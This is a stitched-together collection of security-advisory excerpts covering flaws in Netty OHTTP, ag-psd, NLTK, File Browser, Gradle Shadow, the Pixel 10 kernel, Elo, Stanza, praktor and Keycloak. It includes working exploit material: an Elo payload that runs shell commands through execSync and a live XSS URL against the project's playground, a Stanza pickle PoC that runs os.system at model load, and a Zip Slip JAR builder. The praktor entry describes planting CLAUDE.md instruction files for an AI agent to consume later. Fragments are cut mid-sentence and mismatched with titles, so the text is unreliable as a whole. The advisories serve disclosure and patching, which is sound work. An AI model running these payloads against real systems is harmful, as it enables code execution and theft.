For 0.0.20.Final through 0.0.23.Final, the PoC output consistently showed:

* large client after completion: refCnt=1 capacity=262144 ... readableBytes=0
* large server after completion: refCnt=1 capacity=262144 ... readableBytes=0

Title: [MAVEN] netty-incubator-codec-ohttp: OHTTP codecs retain consumed outer cumulation buffers after completed exchanges

Text:
## PoC:

A local test only:

```
codec-ohttp/src/test/java/io/netty/incubator/codec/ohttp/OHttpCumulationBufferRetentionTest.java
```

The test reuses existing OHTTP test helpers and BouncyCastle crypto provider to perform valid completed OHTTP exchanges over EmbeddedChannel pairs. It sends both a small and a large request/response exchange, confirms completion, then reflects the private cumulationBuffer field from both OHttpClientCodec and OHttpServerCodec.

Command:

```
./mvnw -pl codec-ohttp -Dtest=OHttpCumulationBufferRetentionTest -DfailIfNoTests=false test
```

Observed output:

```
small client after completion: refCnt=1 capacity=1064 readerIndex=1064 writerIndex=1064 readableBytes=0
small server after completion: refCnt=1 capacity=1110 readerIndex=1110 writerIndex=1110 readableBytes=0
large client after completion: refCnt=1 capacity=262144 readerIndex=131114 writerIndex=131114 readableBytes=0
large server after completion: refCnt=1 capacity=262144 readerIndex=131160 writerIndex=131160 readableBytes=0
small after close: clientOldRefCnt=0 serverOldRefCnt=0
large after close: clientOldRefCnt=0 serverOldRefCnt=0
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
BUILD SUCCESS
```

Interpretation:

After completion, both the client and server cumulationBuffer objects have:

* refCnt=1
* readableBytes=0
* large retained capacity for the large exchange
* channel still open/active
* OHTTP context completed/destroyed

After channel close/handler removal, the previously retained buffers are released and their old refCnt values become 0.
Title: [MAVEN] netty-incubator-codec-ohttp: OHTTP codecs retain consumed outer cumulation buffers after completed exchanges

Text:
### Summary

readPsd() commits the image/layer buffers from the declared header geometry (width x height x channels x depth, and per-layer rectangles) before validating those values against the actual data. A tiny crafted PSD declaring huge geometry forces a multi-gigabyte allocation.

### Impact

On ag-psd 30.2.0, Node 24, a 52-byte PSD makes readPsd(buf) commit ~3.17 GB (measured peak RSS) in ~0.45 s before throwing a catchable RangeError ("Offset is outside the bounds of the DataView") — about 61,000,000x amplification. Because the buffer is committed before validation, the allocation OOM-kills the process before the error on essentially any host (uncatchable), and concurrent requests exhaust memory. Any service reading untrusted PSDs with ag-psd is exposed to a remote DoS.

This is distinct from #39 and #206, which involve genuinely large PSDs (memory proportional to real data). Here the input is 52 bytes: the file declares enormous geometry that is never present, so the allocation is driven by an unvalidated header field, not by actual content, an uncontrolled-allocation denial-of-service vulnerability, not proportional memory use.

### Root cause

psdReader.js sizes the off-heap typed-array buffers from the declared header dimensions (and per-layer rectangles, a second independent lever) before validating against the available bytes.

### Suggested fix

Validate the declared dimensions, channel count, depth, and per-layer rectangles against the actual input length (and a sane maximum) before allocating.
Title: [NPM] ag-psd can exhaust memory when parsing crafted PSD dimensions

Text:
## Summary

The public CCG lexicon parser `nltk.ccg.lexicon.fromstring` parses caller-influenced lexicon text with two pure-Python loops whose cost is quadratic in the input width. A service that parses an untrusted CCG lexicon string can be driven into tens of seconds of single-threaded CPU by a few-megabyte input, starving the request worker. No authentication or user interaction is required.

## Root Cause

`matchBrackets` consumes a bracket body one character at a time with `inside = inside + rest[0]; rest = rest[1:]`. The `rest = rest[1:]` tail re-slice copies the entire remaining string on every iteration, so a flat bracket body costs O(n^2). `augParseCategory` drives a `while rest != "":` operator loop that re-copies the regular-expression match tail (`rest = app[3]`) once per operator, which is also O(n^2) over a long operator chain. The parser carries a recursion-depth guard (`MAX_PARSE_DEPTH = 500`) that raises on deeply nested categories, but both quadratic loops run on flat input whose nesting depth stays at zero, so that guard never fires. No bound is applied to line length or category width before the text reaches these loops.
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Impact

An attacker who can influence the CCG lexicon string parsed by an application causes sustained single-threaded CPU consumption (availability loss). The vulnerable path is network-reachable (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost grows quadratically with attacker-chosen input size, a few-megabyte payload costs tens of seconds per core, and a small number of concurrent requests can exhaust worker threads. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only; it does not wrap these pure-Python slicing loops, so it provides no protection here.
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Attack Chain

1. **Exposure:** An application calls the public `nltk.ccg.lexicon.fromstring(lex_str)` (also reachable as `nltk.ccg.chart.fromstring`) on lexicon text the attacker can influence.
2. **Control:** The attacker fully controls the body width (a run of characters inside one bracket) and the operator-chain length; neither is capped by `fromstring`.
3. **Path:** `fromstring` splits input into lines and routes each category through `nextCategory`, which dispatches to `matchBrackets` (Vector A) or into the `augParseCategory` operator loop (Vector B).
4. **Guard:** The only relevant guard is the `MAX_PARSE_DEPTH = 500` recursion-depth check. On flat input the recursion depth is zero, so `if _depth > max_depth` is never reached; the width loops run unbounded.
5. **Primitive:** The tail re-slice `rest = rest[1:]` and tail re-copy `rest = app[3]` execute a quadratic number of string copies.
6. **Result:** Sustained single-core CPU exhaustion; a few-megabyte lexicon costs tens of seconds and scales quadratically, blocking the parsing thread.
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Bypass Evidence

The one protection present on this path is the recursion-depth guard `MAX_PARSE_DEPTH = 500` (nltk/ccg/lexicon.py:22), checked at lexicon.py:153 and lexicon.py:228. It defends only against nesting depth and raises a bounded `ValueError` for deeply nested categories. The quadratic payloads here are flat: a single bracket body or a single operator run has nesting depth zero to one, so the depth check provably never fires while the width loops consume quadratic time. This was confirmed by running the shipped parser: the payloads complete without a `ValueError` or a regex `TimeoutError` while consuming quadratic CPU (Vector A shows a clean 4x cost per input doubling). A repository search finds no line-length or category-width cap anywhere on the `fromstring` path; the regex source-length limit bounds regex patterns, not lexicon text. The strongest disproof attempt (that CPython in-place string concatenation makes Vector A linear) fails because `rest = rest[1:]` is an unconditional copy of the remaining input that the concatenation fast path cannot elide, and the measured 4x-per-doubling ratio confirms the quadratic empirically.
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Affected Versions

- `Ecosystem: PyPI (pip)`
- `Package: nltk`
- `Confirmed affected range: <= 3.10.3`
- `Latest release checked: 3.10.3 (PyPI, https://pypi.org/pypi/nltk/json)`
- `Fix status: 3.10.4`

The width-slicing loops ship in every release carrying the CCG lexicon parser and are present in the current latest published release, 3.10.3. The lower boundary was not bisected, so the introducing version is left open; the behavior long predates the recent regular-expression and recursion-depth hardening.
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Suggested Fix

Scan the bracket body and the operator chain with an index cursor into the original string (or a `collections.deque`) instead of repeatedly re-slicing or re-copying the tail, so each character is handled in constant amortized time. As defense in depth, impose an explicit bound on lexicon line length and category width at the `fromstring` chokepoint and raise a bounded error when it is exceeded, mirroring the existing depth guard. No configuration-only mitigation fully removes the exposure for a service that must parse untrusted lexicons; until a fix ships, callers should cap the size of accepted lexicon input and parse it under a CPU or time budget in an isolated worker.

Reported by zx (GitHub: @manus-pi).
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Fix status

PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured).

Fix commit: cf12a5e6a (nltk/ccg/lexicon.py: matchBrackets, nextCategory and augParseCategory thread a cursor instead of re-slicing the tail; the trailing capture group is dropped; MAX_PARSE_LEN=100000 caps the input).

Probe: nltk/test/unit/security_probes/ghsa_89p3_fcch_88ph.py (on the PR). Verdict on the PR head: FIXED (scaling 4.4x over a 4x input; an over-cap chain is rejected by MAX_PARSE_LEN). The advisory PoC re-run on develop 2fa3f48fe: vector A (bracket body, 100k vs 400k) 15.8x and vector B (operator chain, 8k vs 32k) 11.3x over a 4x input, so develop is still VULNERABLE.
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Root Cause

```text
Affected functions:
- nltk.ccg.lexicon.matchBrackets       (nltk/ccg/lexicon.py:149-172; tail re-slice at line 168)
- nltk.ccg.lexicon.augParseCategory    (nltk/ccg/lexicon.py:223-268; APP_RE tail re-copy at line 250)
Public entry point: nltk.ccg.lexicon.fromstring (nltk/ccg/lexicon.py:271), also re-exported as nltk.ccg.chart.fromstring.
```

## Proof of Concept

```text
Environment: nltk 3.10.3, regex 2026.9.10, CPython. Run the parser on the shipped public API.
```

```python
import nltk.ccg.lexicon as L

# Vector A: flat bracket body -> matchBrackets tail re-slice is O(n^2)
n = 400000
lex_a = ":- S\nw => (" + "a" * n + ")\n"

# Vector B: long operator chain -> augParseCategory tail re-copy is O(n^2)
m = 32000
lex_b = ":- a\nw => " + "a" + "/a" * m + "\n"

import time
for name, s in (("A", lex_a), ("B", lex_b)):
    t = time.perf_counter()
    try:
        L.fromstring(s)
    except Exception:
        pass  # downstream parse error is irrelevant; the CPU is already burned
    print(name, round(time.perf_counter() - t, 3), "s")
```

```text
Negative control (":- a\nw => (a/a)"):   ~0.00007 s
Vector A (matchBrackets, flat body):     n=50k 0.078s | 100k 0.260s | 200k 1.046s | 400k 2.083s   (~4x per doubling => O(n^2))
Vector B (augParseCategory, operators):  m=4k 0.078s | 8k 0.215s | 16k 0.485s | 32k 1.329s        (super-linear)
```
Title: [PIP] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains

Text:
## Summary

File Browser v2.63.15 can leave a public directory share behind when the shared directory is deleted through a path with a trailing slash. The share cleanup path calls `DeleteWithPathPrefix(file.Path, userID)`, but the Bolt backend performs the database prefix query with the unnormalized argument before trimming the slash for boundary checks. For a stored share at `/a`, deleting `/a/` queries for paths prefixed by `/a/`, so the exact `/a` share is never loaded and never deleted.

If a directory with the same path is later recreated, the stale public share becomes active again and exposes the new directory contents through the old public URL.
Title: [GO] File Browser: Trailing-slash directory deletion leaves public shares active for recreated paths

Text:
## Impact

An authenticated user with share, download, and delete permissions can create a valid public share, delete the shared path with a trailing slash, and leave the public link in storage. The link is dormant while the path does not exist, but it exposes future content if the same path is recreated later. The final data exposure is unauthenticated through the public share URL.

This bypasses the intended lifecycle cleanup around public shares and is adjacent to the recent public-share path-existence and prefix-boundary fixes.
Title: [GO] File Browser: Trailing-slash directory deletion leaves public shares active for recreated paths

Text:
## Root cause

For `pathPrefix == "/a/"`, the database prefix query can return descendants such as `/a/child`, but it does not return the exact share path `/a`. The later `TrimRight` cannot delete the exact share because that row was not loaded from storage.

A request for `/a/` therefore removes the directory but misses the exact `/a` share row.

## Remediation

Normalize the path before querying the share index, and cover both the exact normalized path and its descendants. Add regression tests where a stored share path `/a` is removed by `DeleteWithPathPrefix("/a/", userID)` and where `DELETE /api/resources/a/` deletes the exact public share row.

Fixed in version 2.63.17.
Title: [GO] File Browser: Trailing-slash directory deletion leaves public shares active for recreated paths

Text:
## Reproduction

The following test was run against v2.63.15, commit `be23ab3a15bf957928ecfed88de5ab67850c1b9c`.

1. Create a scoped user with share, download, and delete permissions.
2. Create `/a/old.txt` in that user's scope.
3. Store a valid public share row with `Hash: "h"`, `UserID: 1`, and `Path: "/a"`.
4. Send an authenticated delete request for `/a/` through the resource delete handler.
5. Confirm the directory is deleted.
6. Confirm share hash `h` still exists in storage.
7. Recreate `/a/future.txt`.
8. Request the public share handler at `h/` and observe that the unauthenticated response includes `future.txt`.

Command used for the local proof:

```bash
go test ./http -run TestValidationTrailingSlashDeleteLeavesExactDirectoryShare -count=1 -v
```

Observed result:

```text
=== RUN   TestValidationTrailingSlashDeleteLeavesExactDirectoryShare
--- PASS: TestValidationTrailingSlashDeleteLeavesExactDirectoryShare (0.03s)
PASS
ok  github.com/filebrowser/filebrowser/v2/http  0.044s
```
Title: [GO] File Browser: Trailing-slash directory deletion leaves public shares active for recreated paths

Text:
### Summary

ShadowCopyAction in the Shadow plugin does not validate or sanitize ZIP entry names before writing them to the output fat JAR. A malicious upstream dependency containing path traversal sequences (e.g. `../../../../tmp/pwned.txt`) in entry names will have those entries reproduced verbatim in the output shadow JAR.

### Details

The vulnerability exists because Shadow relies entirely on Gradle's ZipFileTree for entry sanitization rather than implementing its own path validation. This means:

1. Users on Gradle < 7.6.2 / 8.x < 8.2.0 are directly exploitable
2. The produced shadow JAR becomes a Zip Slip weapon against any
downstream consumer using unprotected extraction (raw ZipInputStream,
older CI tooling, custom Java unpackers)
3. If Shadow ever uses a non-ZipFileTree code path, protection
disappears silently

Affected file: `src/main/kotlin/com/github/jengelman/gradle/plugins/shadow/internal/ShadowCopyAction.kt`

### Impact

Any tool extracting the shadow JAR with unprotected extraction is subject to arbitrary file overwrite. Users on older Gradle versions  are directly vulnerable at build time.
Title: [MAVEN] Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization

Text:
### PoC

1. Create a malicious JAR with path traversal entry:

```python
import zipfile
with zipfile.ZipFile('evil.jar', 'w') as zf:
    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')
```

2. Add as dependency in a shadow project
3. Run `gradle shadowJar`
4. Run `unzip -l build/libs/*.jar | grep "\.\."`
5. Traversal entry survives in output JAR
Title: [MAVEN] Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization

do_read_data/5 in lib/bandit/http2/stream.ex keeps every DATA frame payload as its own list element until the read returns. Text: We recently published an [exploit chain](https://projectzero.google/2026/01/pixel-0-click-part-1.html) for the Google Pixel 9 that demonstrated it was possible to go from a zero-click context to root on Android in just two exploits. The Dolby 0-click vulnerability existed across all of Android, until it was patched in January 2026. While we had an exploit chain for the Pixel 9, we wanted to see if it was possible to write a similar exploit chain for Pixel 10.
Title: A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens

Text:
## Updating the Dolby Exploit

Altering our [exploit](https://projectzero.google/2026/01/pixel-0-click-part-1.html) for CVE-2025-54957 was fairly straightforward. The majority of needed changes involved updating offsets calculated for the specific version of the library we targeted on the Pixel 9 to similar offsets in the library for Pixel 10. The only challenge (outside of wishing we’d better documented which syncframes contained offsets) was that the Pixel 10 uses RET PAC in the place of `-fstack-protector`, which meant that `__stack_chk_fail` wasn’t available to be overwritten by code. After a bit of trial and error, we used `dap_cpdp_init`, initialization code that can be overwritten without causing functional problems, as it is called once when the decoder is initialized and never again. The updated Dolby UDC exploit is available [here](https://project-zero.issues.chromium.org/428075495#attachment76717436). This exploit will only work on unpatched devices (SPL December 2025 or earlier).
Title: A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens

Text:
## Removal of BigWave, Addition of VPU

Porting the local privilege escalation link of the chain to Pixel 10 was not feasible as the BigWave driver does not ship on this device. However, a new driver is visible in the mediacodec SELinux context at /dev/vpu. This driver is used for interacting with the [Chips&Media Wave677DV](https://www.chipsnmedia.com/en/products/video.php) silicon [on the Tensor G5 chip](https://www.smartprix.com/bytes/google-tensor-g5-on-pixel-10-series-what-we-know-so-far/) meant for accelerating video decoding. Based on the comments within the open-source C files, this driver is developed and maintained by the same set of developers who built the BigWave driver. Working in collaboration with Jann Horn, we spent 2 hours auditing this VPU driver and discovered an exceptional vulnerability.

Unlike the upstream Linux driver for WAVE521C (which is an older Chips&Media chip), the Pixel driver for [WAVE677DV](https://chipsnmedia.com/en/products/video.php) does not integrate with V4L2 (the “Video for Linux API”); instead, it directly exposes the chip’s hardware interface to userspace, including letting userspace map the chip’s MMIO register interface. The driver mainly establishes device memory mappings, does power management, and allows userspace to wait for interrupts from the chip.
Title: A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens
Heading_Path: Removal of BigWave, Addition of VPU

Text:
## The Holy Grail of Kernel Vulnerabilities

This mmap handler is intended to be used in order to map the MMIO register region of the VPU hardware into the userland virtual address space - a region contained within a certain physical memory address range. In doing so, it makes a call to remap_pfn_range based purely on the size of the VMA and not at all bounded to the size of this register region. This means that, by specifying a size larger than the register region in an mmap syscall, the caller can map as much physical memory as they want into userland, starting at the physical address of the VPU register region. The entirety of the kernel image (including .text, and .data region) is located at a higher physical address than the VPU register region, and can therefore be accessed and modified by userspace with this bug.

At this point, one can simply overwrite any kernel function to gain kernel code execution - or indeed any primitive one might desire. This is rendered even easier by the fact that the [kernel is always at the same physical address](https://projectzero.google/2025/11/defeating-kaslr-by-doing-nothing-at-all.html) on Pixel and so the offset between the VPU memory region and the kernel is always a known value. Thus it is not even necessary to scan for the kernel in the mapped physical memory - you simply know exactly where it is relative to the address returned by mmap, presuming you make the VMA length large enough.

Achieving arbitrary read-write on the kernel with this vulnerability required 5 lines of code and writing a full exploit for this issue required less than a day of effort.
Title: A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens
Heading_Path: The Holy Grail of Kernel Vulnerabilities

Text:
## Patch Process

I reported this bug on November 24, 2025 and Android VRP rated the issue High severity. This is an improvement, given that [the BigWave bug](https://project-zero.issues.chromium.org/issues/426567975) we used for privilege escalation on the Pixel 9 (which had identical security impact) was initially rated as Moderate severity. This represents a meaningful and positive change in posture regarding how these types of bugs are triaged and patched. The vulnerability was patched 71 days after its initial report, in the February Pixel security bulletin. This is notably fast given that this is the first time that an Android driver bug I reported was patched within 90 days of the vendor first learning about the vulnerability.
Title: A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens

Text:
## Conclusion

There are both positives and negatives to take from this research. A key goal of Project Zero is to drive systemic improvements that go beyond individual bug fixes, influencing better development processes and more resilient codebases that lead to improvements in security for end-users. The handling of this VPU vulnerability demonstrates clear progress in Android’s triage pipeline, as this bug had an initial remediation in a much shorter period of time than the previous BigWave issues. Android’s effort to ensure that serious vulnerabilities are patched efficiently will help protect many Android devices.

At the same time, this case underscores the ongoing need for more exhaustively robust and security-aware code in Android drivers. When I reported the bugs in BigWave, I hoped to spur its developers to evaluate their other drivers for obvious security issues, but 5 months later we nevertheless found a serious and extremely shallow vulnerability in their VPU driver that was instantly noticeable with even a cursory audit of the codebase. Strengthening driver security remains a crucial priority for ensuring a safe Android ecosystem, and we continue to strongly encourage vendors to improve software development practices in a proactive effort to prevent these sorts of vulnerabilities from ever reaching end-users.

Security reports often uncover complex issues missed by the product teams but it is important that software vendors take necessary steps to ensure software products, especially security-critical ones, launch in a reasonably vulnerability-free state and that software teams take a proactive approach to software security, code auditing, and vulnerability patching.
Title: A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens

Text:
### Summary

An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host JavaScript runtime. A payload built from the `.constructor.constructor` chain compiles, without modification, to a live `Function` invocation in the emitted JavaScript, escaping any sandbox assumption around "Elo is a safe data/DSL language."

### Vulnerable sink and root cause

Three interacting sites in `src/` produce the bug at commit `749af7b`:

1. **`src/transform.ts:144–158`** — the `member_access` handler allows access on types `any`, `object`, or `array` without filtering the property name. This is the only place an integrator could have plugged a denylist.
2. **`src/compilers/javascript.ts:210`** — the JS emitter writes `${objectExpr}.${ir.property}` verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript.
3. **`src/parser.ts:163–170, 748–750`** — the parser accepts `constructor` (and other JS meta-property names) as an ordinary identifier, so `.constructor` clears type-checking without triggering any warning.

Combined, the Elo expression `({}).constructor.constructor('…')()` compiles to a live `Function('…')()` call in the emitted JS, executing in the realm of whichever sink runs the compiled code.

### Attack surfaces

All three surfaces share the same root cause (no denylist in `transform.ts`) and are addressed by the same one-file patch:
Title: [NPM] Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access

Text:
### Attack surfaces

| # | Entry point | Threat model |
|---|---|---|
| 1 | Browser playground — `https://elo-lang.org/try/?code=…&run=1` | **0-click XSS / account takeover** against elo-lang.org. `?run=1` triggers `setTimeout(() => this.run(), 100)` in `playground_controller.ts:531`; the server issues a 301 that preserves `?code=`. Any shared URL that contains a payload compromises the visitor's session on elo-lang.org. |
| 2 | `bin/elo` CLI | **RCE on CI / DevOps hosts.** Both `node bin/elo payload.elo` and `node bin/elo -e "_" -d @payload.elo -f elo` fire. The `-f elo` path is especially severe: the flag exists to pass user-supplied files as *data* into an Elo pipeline. No integrator expects a data-format flag to shell out to `/usr/bin/id`. |
| 3 | Library API — `defaultFormats.elo.parse()` | **Node.js RCE for any downstream integrator** using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases). |

### Independence from GHSA #3 (AST-API injection)

This finding is independent of the Medium-severity AST-API report (GHSA #3). That fix's identifier regex `^[a-zA-Z_][a-zA-Z0-9_]*$` happens to accept `constructor`, and its threat model requires an attacker-controlled AST *object* rather than a plain string. The current finding requires only a plain Elo string, which is a strictly weaker attacker model.
Title: [NPM] Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access

Text:
### Proof of Concept

**Common payload (works on all three entry points):**

```elo
({}).constructor.constructor('return this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\').toString()')()
```

**Library API** — `poc-minimal.js`:

```js
// npm install elo
const { defaultFormats } = require('elo');

const payload = "({}).constructor.constructor('return this.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()')()";

console.log(defaultFormats.elo.parse(payload));
// → uid=1000(ultrasupara) gid=1000(ultrasupara) groups=…
```

**CLI** — `poc-cli.sh`:

```sh
node bin/elo payload.elo
# uid=1000(ultrasupara)…

node bin/elo -e "_" -d @payload.elo -f elo
# uid=1000(ultrasupara)…
```

**Browser playground** — 0-click XSS URL:

```
https://elo-lang.org/try/?code=%28%7B%7D%29.constructor.constructor%28%27alert%28document.domain%29%27%29%28%29&run=1
```

Opening this URL causes `alert(document.domain)` to fire automatically after ~100 ms with no user interaction beyond navigating to the link. The 301 redirect preserves the `?code=` parameter intact. End-to-end execution on the live production site was captured in a screen recording attached to the original report.
Title: [NPM] Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access

Text:
## TL;DR

Loading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `Trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. Result: `weights_only=True` gives no protection here, and model loading executes code.

Confirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload `__reduce__` returns `(os.system, (cmd,))` ran the command at load time (marker file showed `uid=501(...)`, `executed_by=...`).

A downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. `stanza.Pipeline(lang=..., processors="tokenize,pos,lemma", lemma_model_path="<attacker-influenced .pt>")` (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into `Trainer.load` -> `_unpack_pos_dict` and executes the embedded pickle at construction time.
Title: [PIP] Stanza: RCE via pickle deserialization in the lemmatizer

Text:
## The vulnerable path

**Reachable from the documented API.** `stanza.Pipeline(..., lemma_model_path=<file>)` -> `LemmaProcessor._set_up_model` -> `Trainer(model_file=…)` -> `Trainer.load`. Any shared/distributed checkpoint, custom registry, or caller-supplied `lemma_model_path` reaches it. No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.

Note: this is **not** the `weights_only=False` fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.
Title: [PIP] Stanza: RCE via pickle deserialization in the lemmatizer

Text:
## Fix

A legitimate `pos_dict` is a nested `{pos: {word: lemma}}` string mapping no class/function globals, so it loads cleanly, while any `os.system`-style payload is rejected by `find_class`. JSON would work equally well (all keys/values are strings) and remove pickle from this path entirely. Apply to both `_unpack_pos_dict` and, for forward compatibility, `_pack_pos_dict`.
Title: [PIP] Stanza: RCE via pickle deserialization in the lemmatizer

Text:
## The vulnerable path

`stanza/models/lemma/trainer.py`:

```python
# _pack_pos_dict (write side): pos_dict -> pickle -> gzip -> bytes, stored under checkpoint['dicts']

def _unpack_pos_dict(data):                 # line 54
    buf = io.BytesIO(data)
    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
        raw = gz.read()
    return pickle.loads(raw)                # <-- unrestricted default unpickler
```

```python
def load(self, filename, ...):              # line 365
    checkpoint = torch.load(filename, ..., weights_only=True)   # outer allowlist; bytes pass through intact
    ...
    if dicts_version == _DICTS_VERSION_POS:                     # dicts_version == 2 (current format)
        self.pos_dict = _unpack_pos_dict(checkpoint['dicts'])   # line 378, no validation
```
Title: [PIP] Stanza: RCE via pickle deserialization in the lemmatizer

Text:
## Minimal PoC

```python
import gzip, io, os, pickle, tempfile, torch
from stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS

MARKER = os.path.join(tempfile.gettempdir(), "stanza_lemma_poc_pwned")

class Payload:
    def __reduce__(self):
        return (os.system, ("id > %s 2>&1; echo executed_by=$(whoami) >> %s" % (MARKER, MARKER),))

buf = io.BytesIO()
with gzip.GzipFile(fileobj=buf, mode="wb") as gz:        # same shape as _pack_pos_dict()
    gz.write(pickle.dumps(Payload(), protocol=4))

ckpt = {"dicts": buf.getvalue(), "dicts_version": _DICTS_VERSION_POS}
pt = os.path.join(tempfile.gettempdir(), "evil_lemma.pt")
torch.save(ckpt, pt, _use_new_zipfile_serialization=False)

loaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact
_unpack_pos_dict(loaded["dicts"])                            # == trainer.py:378 -> command runs
print("pwned:", open(MARKER).read().strip())
```

The PoC calls `_unpack_pos_dict` directly: the exact expression at `trainer.py:378`. Reaching it through `stanza.Pipeline(...)` additionally requires the crafted file to carry a well-formed `config`/`vocab` so `load` runs to line 378 (established by source review); the deserialization to execution step is confirmed at runtime.
Title: [PIP] Stanza: RCE via pickle deserialization in the lemmatizer

Text:
## Fix

Deserialize the inner stream with the `RestrictedUnpickler` the project already uses in `stanza/models/common/doc.py` (allowlists `tuple`/`list`/`dict` only):

```python
from stanza.models.common.doc import RestrictedUnpickler

def _unpack_pos_dict(data):
    buf = io.BytesIO(data)
    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
        raw = gz.read()
    return RestrictedUnpickler(io.BytesIO(raw)).load()
```
Title: [PIP] Stanza: RCE via pickle deserialization in the lemmatizer

Text:
### Impact

A remote Telegram user can write files to arbitrary paths inside an agent's persistent workspace volume (`praktor-wk-<workspace>`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory.

The attacker controls the Telegram document filename, which was concatenated into the destination path without sanitization (`internal/telegram/bot.go`, at both upload sites) and resolved with `path.Join`, which collapses `../` sequences. A filename like `../../../CLAUDE.md` resolved to the root of the agent workspace volume, outside `uploads/`.

Because the agent workspace is the persistent working directory the Claude agent reads from and operates on across runs, writing outside `uploads/` lets an attacker plant or overwrite files the agent later consumes — e.g. `CLAUDE.md`, agent instruction/skill/hook files, or other config under `/workspace/agent`. This turns a file upload into a stored injection into the agent's instruction/execution surface (CWE-22 path traversal escalating to stored instruction injection).

### Reachability

By default the bot has no user allowlist (`allow_from: []` means "allow all"), so the only precondition is that a user can message the bot. No authentication or prior privilege is required.

### Affected versions

Through `v0.9.0` (and HEAD `3902d29`).

### Patched versions

`v0.9.1`, containing PR #228.

### Workarounds

Restrict `telegram.allow_from` to trusted user IDs to limit who can send uploads to the bot. Upgrading to `v0.9.1` is the recommended fix.

### Fix (defense in depth)

- `internal/telegram/bot.go`: apply `path.Base()` to the attacker-controlled filename at both upload sites, stripping directory components and `..`.
- `internal/container/manager.go`: `WriteVolumeBytes` now rejects any path that escapes `/vol` after `path.Join`, protecting future callers.

### Credit

Reported privately by [tonghuaroot](https://github.com/tonghuaroot), who provided a detailed root-cause analysis, a deployed end-to-end proof of concept against the real `container.Manager`, and fix verification.
Title: [GO] praktor: Path traversal in Telegram file uploads allows writing outside the agent workspace uploads/ directory (stored instruction injection)

### Description

A flaw was found in Keycloak. This JWT algorithm confusion vulnerability in the JWT Authorization Grant flow allows an attacker with valid client credentials to bypass signature verification. By forging an assertion, the attacker can create unauthorized access tokens. This enables the attacker to impersonate any federated user linked to the affected Identity Provider, leading to unauthorized access and potential privilege escalation.
Title: [MAVEN] Keycloak has authentication bypass via jwt algorithm confusion
